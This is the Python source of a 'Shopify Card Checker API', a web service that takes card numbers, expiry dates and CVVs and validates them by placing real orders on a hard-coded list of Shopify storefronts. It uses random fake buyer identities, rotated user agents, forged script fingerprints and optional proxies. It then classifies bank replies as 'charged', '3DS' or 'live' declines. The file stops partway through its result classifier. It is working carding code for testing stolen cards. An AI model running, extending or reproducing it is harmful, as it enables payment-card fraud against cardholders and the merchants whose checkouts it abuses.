"""
Shopify Card Checker API - Hosted on Railway
Receives card data + site, does Shopify checkout, returns bank result.
"""
import os
import asyncio
import json
import random
import string
import time
import uuid
import hashlib
import re
import logging
from urllib.parse import urlparse, parse_qs, unquote

import aiohttp
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
logger = logging.getLogger("shopify_api")

app = FastAPI(title="Shopify Card Checker API")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
]

SHOPIFY_SITES = [
    "www.rarebeauty.com", "www.olehenriksen.com", "www.fentybeauty.com",
    "shopmissa.com", "dayspring-pens.myshopify.com", "brokeallday.myshopify.com",
    "boatcarpetbuys.myshopify.com", "aloracosmetics.myshopify.com", "www.wetnwildbeauty.com",
    "www.anastasiabeverlyhills.com", "bulletmole1.myshopify.com", "www.puravidabracelets.com",
    "www.glowrecipe.com", "biggerfive.myshopify.com", "www.revlon.com",
    "cubitt-official.myshopify.com", "better-boat.myshopify.com",
    "desert-does-it.myshopify.com", "dose-of-colors.myshopify.com", "www.brooklinen.com",
    "coyotevest.myshopify.com", "1x2r9x-2w.myshopify.com", "www.deadstock.ca",
    "www.skims.com", "www.loveyourmelon.com", "bosideng-fashion.myshopify.com",
    "www.stevemadden.com", "www.hauslabs.com", "www.teeinblue.com",
    "www.kyliecosmetics.com", "www.maccosmetics.com", "camprageous.myshopify.com",
    "couch-collectibles.myshopify.com", "biaggi-1.myshopify.com", "canisathlete.myshopify.com",
    "www.jennikayne.com", "www.kosas.com", "www.tarte.com", "www.morphe.com",
    "www.glossier.com", "brendagrands.myshopify.com", "cove-home-8002.myshopify.com",
    "colourpop.com", "www.summerfridays.com", "www.everlane.com",
    "conner-hats.myshopify.com", "negativeunderwear.com", "helmboots.com",
    "www.outdoorvoices.com", "carbon-38.myshopify.com", "www.kizik.com",
    "www.mejuri.com", "www.danielwellington.com", "bychari.myshopify.com",
    "dapper-lighting.myshopify.com",
]

FAKE_GATEWAYS = {"bogus", "test", "fake", "debug", "manual"}

LIVE_DECLINE_CODES = {
    "insufficient_funds", "do_not_honor", "generic_decline",
    "lost_card", "stolen_card", "pickup_card", "restricted_card",
    "not_permitted", "security_violation", "incorrect_cvc", "incorrect_zip",
    "card_velocity_exceeded", "transaction_not_allowed", "try_again_later",
    "fraudulent", "issuer_not_available", "processing_error",
}

ADDRESSES = [
    {'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'DC', 'zip': '20500', 'phone': '2025551234'},
    {'street': '350 Fifth Ave', 'city': 'New York', 'state': 'NY', 'zip': '10118', 'phone': '2125551234'},
    {'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'IL', 'zip': '60606', 'phone': '3125551234'},
    {'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'CA', 'zip': '90045', 'phone': '3235551234'},
    {'street': '1000 Main St', 'city': 'Houston', 'state': 'TX', 'zip': '77002', 'phone': '7135551234'},
    {'street': '1234 Market St', 'city': 'Philadelphia', 'state': 'PA', 'zip': '19107', 'phone': '2155551234'},
    {'street': '500 Boylston St', 'city': 'Boston', 'state': 'MA', 'zip': '02116', 'phone': '6175551234'},
    {'street': '700 Pike St', 'city': 'Seattle', 'state': 'WA', 'zip': '98101', 'phone': '2065551234'},
    {'street': '225 Bush St', 'city': 'San Francisco', 'state': 'CA', 'zip': '94104', 'phone': '4155551234'},
    {'street': '4040 Spencer St', 'city': 'Las Vegas', 'state': 'NV', 'zip': '89119', 'phone': '7025551234'},
]

PROPOSAL_QUERY = 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},queueToken:$queueToken}){__typename result{__typename ...on NegotiationResultAvailable{queueToken sellerProposal{runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}...on PendingTerms{__typename}}delivery{__typename ...on PendingTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name}}}}}}}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage}}}}'

SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){__typename ...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{__typename ...on NegotiationError{code localizedMessage}...on InputValidationError{field}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}'

POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'


class CheckRequest(BaseModel):
    cc: str
    mm: str
    yy: str
    cvv: str
    site: str = None
    sites: list = None
    proxy: str = None


class CheckResponse(BaseModel):
    status: str
    response: str
    gateway: str
    amount: str = None
    site: str = None
    elapsed: float
    verdict: str = None


def _get_ua():
    return random.choice(USER_AGENTS)

def _extract_between(text, start, end):
    try:
        s = text.index(start) + len(start)
        e = text.index(end, s)
        return text[s:e]
    except ValueError:
        return None

def _generate_script_fingerprint():
    sig_uuid = str(uuid.uuid4())
    seed = f"{sig_uuid}{time.time()}{random.random()}"
    signature = hashlib.sha256(seed.encode()).hexdigest()[:40]
    return {'signature': signature, 'signatureUuid': sig_uuid, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []}

def _checkout_graphql_headers(domain, checkout_url):
    source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
    return {
        'User-Agent': _get_ua(), 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json', 'Origin': f'https://{domain}', 'Referer': checkout_url,
        'x-checkout-web-source-id': source_id,
    }

def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    return f"{name}{num}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"

def _random_name():
    firsts = ["John", "James", "Robert", "Michael", "William", "David"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]
    return random.choice(firsts), random.choice(lasts)

def _random_address():
    return random.choice(ADDRESSES)

def _is_fake_gateway(gw):
    return any(f in (gw or "").lower() for f in FAKE_GATEWAYS)

def _parse_bank_response(text):
    resp = {'response_code': '', 'transaction_id': ''}
    try:
        data = json.loads(text)
        receipt = data.get('data', {}).get('receipt', {})
        pe = receipt.get('processingError', {})
        resp['response_code'] = pe.get('code', '')
        resp['transaction_id'] = receipt.get('id', '')
    except Exception:
        pass
    return resp

def _parse_products(data):
    products = data.get('products', [])
    if not products:
        return None
    min_price = float('inf')
    best = None
    for product in products:
        for variant in product.get('variants', []):
            if not variant.get('available', False):
                continue
            try:
                price = float(str(variant.get('price', '0')).replace(',', ''))
                if 0 < price < min_price:
                    min_price = price
                    best = {'price': f"{price:.2f}", 'variant_id': str(variant['id']), 'handle': product['handle']}
            except Exception:
                continue
    if not best:
        for product in products:
            for variant in product.get('variants', []):
                if variant.get('available', False):
                    try:
                        price = float(str(variant.get('price', '0')).replace(',', ''))
                        best = {'price': f"{price:.2f}", 'variant_id': str(variant['id']), 'handle': product['handle']}
                    except Exception:
                        continue
    return best

def _extract_session_token(text):
    sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
    if not sst:
        sst = _extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
    return sst

def _parse_seller(seller):
    if not seller or not isinstance(seller, dict):
        return '0', 'USD', '0', None, '', '0', None, None
    rt = seller.get('runningTotal', {})
    running_total = rt.get('value', {}).get('amount', '0') if isinstance(rt, dict) else '0'
    currency = rt.get('value', {}).get('currencyCode', 'USD') if isinstance(rt, dict) else 'USD'
    tax_data = seller.get('tax', {})
    tax_amount = '0'
    if isinstance(tax_data, dict) and 'totalTaxAmount' in tax_data:
        tax_amount = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
    delivery_data = seller.get('delivery', {})
    delivery_strategy = ''
    shipping_amount = '0'
    if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
        lines = delivery_data.get('deliveryLines', [])
        strategies = lines[0].get('availableDeliveryStrategies', []) if lines else []
        if strategies:
            delivery_strategy = strategies[0].get('handle', '')
            shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
    pm_id = None
    gw_name = None
    payment_data = seller.get('payment', {})
    if isinstance(payment_data, dict) and payment_data.get('__typename') == 'FilledPaymentTerms':
        payment_lines = payment_data.get('availablePaymentLines', [])
        if payment_lines:
            pm = payment_lines[0].get('paymentMethod', {})
            pm_id = pm.get('paymentMethodIdentifier')
            gw_name = pm.get('name')
    del_type = delivery_data.get('__typename') if isinstance(delivery_data, dict) else None
    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, pm_id, gw_name


async def _negotiate(session, graphql_url, headers, variables):
    for attempt in range(3):
        try:
            resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=8))
            data = await resp.json(content_type=None)
            negotiate = data.get('data', {}).get('session', {}).get('negotiate', {})
            if not negotiate or not isinstance(negotiate, dict):
                continue
            result = negotiate.get('result', {})
            if not result or not isinstance(result, dict):
                result = negotiate
            return result
        except Exception:
            if attempt < 2:
                await asyncio.sleep(0.3)
                continue
            return {'__typename': 'NegotiationResultFailed'}


async def _shopify_check(session, domain, cc, mm, yy, cvv):
    domain = domain.replace('https://', '').replace('http://', '').strip('/')
    base_url = f"https://{domain}"
    gw_name = 'Shopify Payments'
    UA = _get_ua()

    headers = {'User-Agent': UA, 'Accept': 'application/json', 'Content-Type': 'application/json'}
    
    # Find product
    product = None
    for endpoint in [f"{base_url}/collections/all/products.json?limit=10", f"{base_url}/products.json?limit=10"]:
        try:
            async with session.get(endpoint, headers={'User-Agent': UA, 'Accept': 'application/json'}, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    product = _parse_products(data)
                    if product:
                        break
        except Exception:
            continue
    if not product:
        return None, "No products available", gw_name, {'verdict': 'UNTESTED'}

    variant_id = product['variant_id']
    subtotal_price = product['price']
    first, last = _random_name()
    email = _random_email()
    addr = _random_address()
    street, city, state, s_zip, phone = addr['street'], addr['city'], addr['state'], addr['zip'], addr['phone']

    # Add to cart
    try:
        async with session.post(f"{base_url}/cart/add.js", json={'id': int(variant_id)}, headers=headers, timeout=aiohttp.ClientTimeout(total=6)) as resp:
            if resp.status != 200:
                return None, "Failed to add to cart", gw_name, {'verdict': 'UNTESTED'}
    except Exception:
        return None, "Failed to add to cart", gw_name, {'verdict': 'UNTESTED'}

    # Create checkout
    ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml', 'Accept-Language': 'en-US,en;q=0.9'}
    try:
        async with session.post(f"{base_url}/checkout/", headers=ch_headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            checkout_url = str(resp.url)
            text = await resp.text()
    except Exception:
        return None, "Failed to create checkout", gw_name, {'verdict': 'UNTESTED'}

    if 'login' in checkout_url.lower() or 'password' in checkout_url.lower():
        return None, "Site requires login", gw_name, {'verdict': 'UNTESTED'}

    sst = _extract_session_token(text)
    if not sst:
        return None, "No session token", gw_name, {'verdict': 'UNTESTED'}

    queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
    stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')
    currency = 'USD'
    pm_match = re.search(r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?', text.lower())
    if pm_match:
        currency = pm_match.group(1).upper()
    payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
    gql_headers = _checkout_graphql_headers(domain, checkout_url)

    addr_block = {'address1': street, 'address2': '', 'city': city, 'countryCode': 'US', 'postalCode': s_zip, 'firstName': first, 'lastName': last, 'zoneCode': state, 'phone': phone, 'company': ''}

    merch_block = {
        'stableId': stable_id,
        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
        'quantity': {'items': {'value': 1}},
        'expectedTotalPrice': {'value': {'amount': subtotal_price, 'currencyCode': currency}},
        'lineComponentsSource': None, 'lineComponents': [],
    }

    common_vars = {
        'sessionInput': {'sessionToken': sst}, 'queueToken': queue_token,
        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
        'merchandise': {'merchandiseLines': [merch_block]},
        'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'countryCode': 'US'}, 'rememberMe': False},
        'tip': {'tipLines': []},
        'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
        'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []},
        'nonNegotiableTerms': None,
        'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False},
    }

    latest_qt = [queue_token]
    def _make_vars():
        v = {**common_vars}; v['queueToken'] = latest_qt[0]; return v
    def _update_qt(result):
        if not result or not isinstance(result, dict): return
        qt = result.get('queueToken')
        if qt: latest_qt[0] = qt

    # Negotiate shipping
    try:
        step1_vars = _make_vars()
        step1_vars['delivery'] = {'deliveryLines': [{'destination': {'partialStreetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
        step1_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': 'US', 'lastName': '', 'zoneCode': '', 'phone': ''}}}
        
        r = await _negotiate(session, graphql_url, gql_headers, step1_vars)
        _update_qt(r)
        await asyncio.sleep(0.1)
        step1_vars['queueToken'] = latest_qt[0]
        result1 = await _negotiate(session, graphql_url, gql_headers, step1_vars)
        _update_qt(result1)

        if not result1 or not isinstance(result1, dict):
            return None, "Negotiate error: no response", gw_name, {'verdict': 'UNTESTED'}
        tn = result1.get('__typename', '')
        if tn == 'CheckpointDenied': return None, "Checkpoint Denied", gw_name, {'verdict': 'UNTESTED'}
        if tn == 'NegotiationResultFailed': return None, "Negotiation failed", gw_name, {'verdict': 'UNTESTED'}
        if tn != 'NegotiationResultAvailable': return None, f"Negotiation failed: {tn}", gw_name, {'verdict': 'UNTESTED'}

        sp1 = result1.get('sellerProposal')
        if not sp1 or not isinstance(sp1, dict): return None, "No seller proposal", gw_name, {'verdict': 'UNTESTED'}
        running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw = _parse_seller(sp1)
        if api_pmi and not payment_method_id: payment_method_id = api_pmi
        gw_name = api_gw or 'Shopify Payments'

        if not delivery_strategy: return None, "No shipping available", gw_name, {'verdict': 'UNTESTED'}

        def _build_delivery():
            return {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}

        step2_vars = _make_vars()
        step2_vars['delivery'] = _build_delivery()
        step2_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': addr_block}}
        result2 = await _negotiate(session, graphql_url, gql_headers, step2_vars)
        _update_qt(result2)
        if result2 and isinstance(result2, dict) and result2.get('__typename') == 'NegotiationResultAvailable':
            sp2 = result2.get('sellerProposal')
            if sp2 and isinstance(sp2, dict):
                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi2, api_gw2 = _parse_seller(sp2)
                if api_pmi2 and not payment_method_id: payment_method_id = api_pmi2
                if api_gw2: gw_name = api_gw2
    except Exception as e:
        return None, f"Negotiate error: {str(e)[:50]}", gw_name, {'verdict': 'UNTESTED'}

    # Tokenize card
    year_full = f"20{yy}" if len(yy) == 2 else yy
    formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
    token_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": formatted_card, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}

    pci_build_hash = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text)
    pci_referer = f"https://checkout.pci.shopifyinc.com/build/{pci_build_hash.group(1)}/" if pci_build_hash else checkout_url

    try:
        vault_headers = {
            'Content-Type': 'application/json',
            'User-Agent': UA,
            'Origin': base_url,
            'Referer': pci_referer,
            'Accept': 'application/json',
        }
        async with session.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers=vault_headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            vault_data = await resp.json(content_type=None)
            if 'id' not in vault_data:
                err_msg = vault_data.get('error', '') or str(vault_data)[:100]
                logger.info(f"Vault rejected: {err_msg}")
                return None, f"Invalid card - vault rejected ({err_msg[:50]})", gw_name, {'verdict': 'UNTESTED'}
            payment_token = vault_data['id']
    except Exception as e:
        logger.info(f"Vault failed: {str(e)[:80]}")
        return None, "Invalid card - vault failed", gw_name, {'verdict': 'UNTESTED'}

    # Submit payment
    try:
        payment_input = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id, 'sessionId': payment_token, 'billingAddress': {'streetAddress': addr_block}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
        step3_vars = _make_vars()
        step3_vars['delivery'] = _build_delivery()
        step3_vars['payment'] = payment_input
        result3 = await _negotiate(session, graphql_url, gql_headers, step3_vars)
        _update_qt(result3)
        if result3 and isinstance(result3, dict) and result3.get('__typename') == 'NegotiationResultAvailable':
            sp3 = result3.get('sellerProposal')
            if sp3 and isinstance(sp3, dict):
                running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, _, api_gw3 = _parse_seller(sp3)
                if api_gw3: gw_name = api_gw3
                payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total
    except Exception:
        pass

    # Submit order
    submit_delivery = {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': True, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
    submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
    checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
    attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]

    completion_vars = {'input': {'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0], 'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'delivery': submit_delivery, 'merchandise': {'merchandiseLines': [submit_merch]}, 'payment': payment_input, 'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False}, 'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': _generate_script_fingerprint(), 'optionalDuties': {'buyerRefusesDuties': False}}, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url}}

    async def _do_submit():
        try:
            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=8))
            return await r.text()
        except Exception:
            return '{"error":"submit_timeout"}'

    text = await _do_submit()
    logger.info(f"Submit response: {text[:300]}")

    if "Your order total has changed." in text:
        text = await _do_submit()
    if "The requested payment method is not available." in text:
        return None, "UNTESTED - Payment method unavailable. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}

    receipt_id = None
    try:
        resp_json = json.loads(text)
        submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
        typename = submit_data.get('__typename', '')

        if typename == 'SubmitRejected':
            errors = submit_data.get('errors', [])
            codes = [e.get('code', '') for e in errors]
            all_codes = ', '.join(codes[:2]) if codes else 'UNKNOWN'

            # ALL SubmitRejected codes are Shopify checkout / gateway errors, NOT bank codes
            # Bank codes only come from FailedReceipt after polling, not from SubmitRejected
            return None, f"UNTESTED - Submit rejected: {all_codes}. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}

        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
            receipt_id = submit_data.get('receipt', {}).get('id')
        elif typename == 'SubmitFailed':
            return None, f"UNTESTED - Submit failed: {submit_data.get('reason', 'unknown')}. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
        elif typename == 'Throttled':
            poll_ms = submit_data.get('pollAfter', 2000) or 2000
            await asyncio.sleep(min(int(poll_ms) / 1000.0, 3.0))
            text = await _do_submit()
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                if submit_data.get('__typename') in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                    receipt_id = submit_data['receipt']['id']
                else:
                    return None, "UNTESTED - Throttled. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
            except Exception:
                return None, "UNTESTED - Throttled. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
        elif typename == 'CheckpointDenied':
            return None, "UNTESTED - Checkpoint denied. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
    except Exception as e:
        logger.info(f"Submit parse error: {str(e)[:100]} raw={text[:200]}")
        return None, "UNTESTED - Submit parse error. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}

    if not receipt_id:
        return None, "UNTESTED - No receipt returned. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}

    # Poll for result — max 25s window
    await asyncio.sleep(0.2)
    poll_json = {'query': POLL_QUERY, 'variables': {'receiptId': receipt_id, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
    
    poll_start = time.monotonic()
    for _ in range(6):
        if time.monotonic() - poll_start > 25:
            return None, "UNTESTED - Receipt not settled in 25s window. Bank never responded.", gw_name, {'verdict': 'UNTESTED', 'code': 'POLL_TIMEOUT'}
        try:
            async with session.post(graphql_url, json=poll_json, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                text = await resp.text()
        except Exception:
            continue
        if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
            break
        try:
            rj = json.loads(text)
            rcpt = rj.get('data', {}).get('receipt', {})
            delay = (rcpt.get('pollDelay', 4000) or 4000) / 1000.0
        except Exception:
            delay = 2.0
        delay = min(delay, 4.0)
        await asyncio.sleep(delay)

    logger.info(f"Poll settled in {time.monotonic() - poll_start:.1f}s")

    if 'ActionRequiredReceipt' in text:
        return running_total, "APPROVED 3DS - Card live, 3DS passed, order unconfirmed — verify manually", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}

    if 'ProcessedReceipt' in text and 'processingError' not in text.lower() and 'FailedReceipt' not in text:
        return running_total, "APPROVED CHARGED - Order created — money moved", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED'}

    # Parse bank code from FailedReceipt
    code = None
    error_message = None
    receipt_typename = None
    try:
        resp_json = json.loads(text)
        receipt = resp_json.get('data', {}).get('receipt', {})
        if isinstance(receipt, dict):
            receipt_typename = receipt.get('__typename', '')
            if receipt_typename == 'FailedReceipt':
                pe = receipt.get('processingError', {})
                code = pe.get('code', '') or ''
                error_message = pe.get('messageUntranslated', '') or ''
            elif receipt_typename == 'ProcessedReceipt':
                return running_total, "APPROVED CHARGED - Order created — money moved", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED'}
    except Exception:
        pass

    if not code:
        code = _extract_between(text, '{"code":"', '"') or ''
    if not error_message:
        error_message = _extract_between(text, '"messageUntranslated":"', '"') or ''

    tl = (text + (code or '') + (error_message or '')).lower()
    code_lower = (code or '').lower()
    logger.info(f"Poll result: typename={receipt_typename} code={code} msg={error_message[:80]}")

    if 'ActionRequiredReceipt' in text:
        return running_total, "APPROVED 3DS - Card live, 3DS passed, order unconfirmed — verify manually", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}

    # ── STRICT CLASSIFIER — per spec ─────────────────────────────────────

    code_lower = (code or '').lower()
    logger.info(f"Poll result: typename={receipt_typename} code={code} msg={error_message[:80]}")

    if 'ActionRequiredReceipt' in text:
        return running_total, "APPROVED 3DS - Bank requires 3DS challenge. Card live. Verify order manually.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}

    # RULE 1: ProcessedReceipt with order ID → APPROVED CHARGED
    if 'ProcessedReceipt' in text and 'FailedReceipt' not in text:
        return running_total, "APPROVED CHARGED - Bank charged the card. Order ID returned.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED'}

    # RULE 2: APPROVED codes — card is LIVE, bank confirmed it exists
    APPROVED_CODES = {
        'insufficient_funds': 'Bank confirmed card is live. Balance too low for this amount.',
        'invalid_cvv': 'Bank confirmed card is live. CVV entered was wrong.',
        'cvv_failure': 'Bank confirmed card is live. CVV entered was wrong.',
        'incorrect_cvc': 'Bank confirmed card is live. CVV entered was wrong.',
        'avs_failure': 'Bank confirmed card is live. Address mismatch.',
        'zip_mismatch': 'Bank confirmed card is live. Address mismatch.',
        'incorrect_zip': 'Bank confirmed card is live. Address mismatch.',
        'incorrect_address': 'Bank confirmed card is live. Address mismatch.',
        '3ds_required': 'Bank requires 3DS challenge. Card live. Verify order manually.',
